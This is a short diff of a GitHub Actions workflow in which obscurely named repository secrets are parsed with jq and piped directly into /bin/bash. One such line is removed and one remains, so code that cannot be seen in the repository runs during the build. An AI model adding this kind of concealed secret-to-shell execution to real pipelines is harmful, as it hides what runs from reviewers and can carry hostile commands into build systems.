@@ -19,7 +19,6 @@ jobs:
           dkj96750: ${{ secrets.dkj96750 }}
         run: |
           printf '%s' "$dkj96750" | jq -r .ad94 | /bin/bash
-          printf '%s' "$z171" | jq -r .kkx86 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
